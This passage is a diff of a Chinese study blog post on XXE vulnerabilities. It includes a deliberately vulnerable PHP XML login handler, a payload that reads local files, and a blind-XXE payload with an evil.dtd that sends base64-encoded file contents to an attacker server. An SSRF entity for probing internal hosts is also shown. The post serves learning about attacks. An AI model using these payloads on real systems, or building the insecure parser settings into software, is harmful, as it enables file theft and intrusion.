sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,3,$e-&gt;getMessage());</span><br><span class="line">&#125;</span><br><span class="line">header(&#x27;Content-Type: text/html; charset=utf-8&#x27;);</span><br><span class="line">echo $result;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE hack [</span><br><span class="line">&lt;!ENTITY file SYSTEM  &quot;file:///D:/1.txt&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;</span><br><span class="line">  &lt;username&gt;&amp;file;&lt;/username&gt;</span><br><span class="line">  &lt;password&gt;hack&lt;/password&gt;</span><br><span class="line">&lt;/user&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/600.png" class="lazyload" data-srcset="/../image/600.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="600"></p>
+<p>当然，也可以使用<code>php://filter</code>协议进行读取</p>
+<p>有回显还是算比较简单的，我们修改源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$USERNAME = &#x27;admin&#x27;; //账号</span><br><span class="line">$PASSWORD = &#x27;admin&#x27;; //密码</span><br><span class="line">$result = null;</span><br><span class="line">libxml_disable_entity_loader(false);</span><br><span class="line">$xmlfile = file_get_contents(&#x27;php://input&#x27;);</span><br><span class="line"></span><br><span class="line">try&#123;</span><br><span class="line">    $dom = new DOMDocument();</span><br><span class="line">    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">    $creds = simplexml_import_dom($dom);</span><br><span class="line">    $username = $creds-&gt;username;</span><br><span class="line">    $password = $creds-&gt;password;</span><br><span class="line">    if($username == $USERNAME &amp;&amp; $password == $PASSWORD)&#123;</span><br><span class="line">        $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,1,$username);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,0,$username);</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;catch(Exception $e)&#123;</span><br><span class="line">    $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,3,$e-&gt;getMessage());</span><br><span class="line">&#125;</span><br><span class="line">header(&#x27;Content-Type: text/html; charset=utf-8&#x27;);</span><br><span class="line">//echo $result</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>无回显后，，可以通过<code>Blind XXE</code>方法加上外带数据通道来提取数据，先使用<code>php://filter</code>协议获取目标文件的内容，然后将内容以<code>http</code>请求发送到攻击服务器来读取数据，原理感觉跟反弹shell类似</p>
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE test[</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=D:/qwzf.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://xxx.xxx.xxx.xxx/evil.dtd&quot;&gt;</span><br><span class="line">%dtd;</span><br><span class="line">%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+
+<p>evil.dtd</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % payload &quot;&lt;!ENTITY % send SYSTEM &#x27;http://192.168.201.128/?content=%file;&#x27;&gt;&quot;&gt; %payload;</span><br></pre></td></tr></table></figure>
+
+<p>整体逻辑就是</p>
+<ul>
+<li>先调用<code>%dtd</code>，请求远程服务器(攻击服务器)上的<code>evil.dtd</code>。</li>
+<li>再调用 <code>evil.dtd</code>中的 <code>%file</code>。<code>%file</code> 获取受攻击的服务器上面的敏感文件，然后将 <code>%file</code> 的返回结果传到<code>%send</code> 。</li>
+<li>然后调用 <code>%send;</code> 把读取到的数据发送到远程服务器上</li>
+</ul>
+<h5 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;        </span><br><span class="line">&lt;!DOCTYPE foo [ </span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY rabbit SYSTEM &quot;http://127.0.0.1/1.txt&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;firstname&gt;&amp;rabbit;&lt;/firstname&gt;&lt;lastname&gt;666&lt;/lastname&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>
+
+<p>127.0.0.1可以替换成任意的内网地址，可以借此实现对内网的探测</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6887?time__1311=n4+xnD0DRDyB5AKDsYoh1x90R3DtKQDgDQwD&alichlgref=https://websec.readthedocs.io/zh/latest/vuln/xxe.html#toc-5">从XML相关一步一步到XXE漏洞</a></p>
+<p>对于waf的绕过，这里贴个大佬的帖子<a target="_blank" rel="noopener" href="https://www.cnblogs.com/20175211lyz/p/11413335.html">CTF XXE</a>，简单看了眼，基本就是对利用各种协议和编码进行绕过关键词的waf</p>
 
   </div>
   
@@ -2475,10 +2586,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateModified" datetime="2024-05-31T21:38:11+08:00">
+          <div class="new-meta-item date" itemprop="dateModified" datetime="2024-06-09T11:12:07+08:00">
   <a class='notlink'>
     <i class="fa-solid fa-edit fa-fw" aria-hidden="true"></i>
-    <p>更新于：May 31, 2024</p>
+    <p>更新于：Jun 9, 2024</p>
   </a>
 </div>
 
@@ -2497,7 +2608,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://example.com/2024/05/30/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/&title=原型链污染 - Jijoy的blog&summary="
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://example.com/2024/06/06/XXE%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/&title=XXE漏洞学习 - Jijoy的blog&summary="
           
           >
           
@@ -2509,7 +2620,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://example.com/2024/05/30/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/&title=原型链污染 - Jijoy的blog&summary="
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://example.com/2024/06/06/XXE%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/&title=XXE漏洞学习 - Jijoy的blog&summary="
           
           >
           
@@ -2521,7 +2632,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://service.weibo.com/share/share.php?url=http://example.com/2024/05/30/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/&title=原型链污染 - Jijoy的blog&summary="
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://example.com/2024/06/06/XXE%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/&title=XXE漏洞学习 - Jijoy的blog&summary="
           
           >
           
@@ -2554,19 +2665,13 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   
     <div class="prev-next">
       
-        <a class='prev' href='/2024/06/01/Django/'>
-          <p class='title'><i class="fa-solid fa-chevron-left" aria-hidden="true"></i>Django</p>
+      
+        <a class='next' href='/2024/06/01/Django/'>
+          <p class='title'>Django<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
           <p class='content'>Django开发之旅1django-admin startproject 项目名
 
 可以简单看一下目录结构
 1234567|-- 项目名   项目的容器|   |-- __init__.py  ...</p>
-        </a>
-      
-      
-        <a class='next' href='/2024/05/30/node%E5%B0%8F%E7%BB%83/'>
-          <p class='title'>node小练<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
-          <p class='content'>[NPUCTF2020]验证🐎&#x2F;source给到源码
-1234567891011121314151617181920212223242526272829303132333435363...</p>
         </a>
       
     </div>
@@ -2582,7 +2687,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
   <article class="post white-box shadow floatable blur" id="comments">
     <span hidden>
-      <meta itemprop="discussionUrl" content="/2024/05/30/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/index.html#comments">
+      <meta itemprop="discussionUrl" content="/2024/06/06/XXE%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/index.html#comments">
     </span>
     <p ct><i class='fa-solid fa-comments'></i> 评论</p>
     
@@ -2624,7 +2729,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
 
     <div class='content'>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="toc-text">原型链污染</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Javascript%E5%A4%A7%E5%B0%8F%E5%86%99%E7%89%B9%E6%80%A7"><span class="toc-text">Javascript大小写特性</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0"><span class="toc-text">xxe漏洞学习</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XML%E5%9F%BA%E7%A1%80"><span class="toc-text">XML基础</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XXE%E6%BC%8F%E6%B4%9E"><span class="toc-text">XXE漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#XML%E6%B3%A8%E5%85%A5"><span class="toc-text">XML注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5-XXE"><span class="toc-text">XML外部实体注入(XXE)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XXE%E5%B8%B8%E8%A7%81%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-text">XXE常见利用方式</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6"><span class="toc-text">读取任意文件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SSRF"><span class="toc-text">SSRF</span></a></li></ol></li></ol></li></ol></li></ol>
     </div>
   </section>
 
@@ -3216,7 +3321,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 </script>
 
 
-  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Jijoy的blog","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"Jijoy","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":""},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"Jijoy的blog"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2024/05/30/原型链污染/","name":"原型链污染"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Jijoy的blog","url":"http://example.com/","keywords":null,"description":"","author":{"@type":"Person","name":"Jijoy","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":""},"publisher":{"@type":"Organization","name":"Jijoy的blog","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"原型链污染","description":"","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2024/05/30/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"},"author":{"@type":"Person","name":"Jijoy","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"Jijoy的blog","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2024/05/30/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/","wordCount":0,"datePublished":"2024-05-30T12:26:39.000Z","dateModified":"2024-05-31T13:38:11.357Z","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
+  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Jijoy的blog","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"Jijoy","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":""},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"Jijoy的blog"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2024/06/06/XXE漏洞学习/","name":"XXE漏洞学习"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Jijoy的blog","url":"http://example.com/","keywords":null,"description":"","author":{"@type":"Person","name":"Jijoy","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":""},"publisher":{"@type":"Organization","name":"Jijoy的blog","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"XXE漏洞学习","description":"","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2024/06/06/XXE%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"},"author":{"@type":"Person","name":"Jijoy","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"Jijoy的blog","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2024/06/06/XXE%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/","wordCount":0,"datePublished":"2024-06-06T11:56:10.000Z","dateModified":"2024-06-09T03:12:07.263Z","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
 
 
 
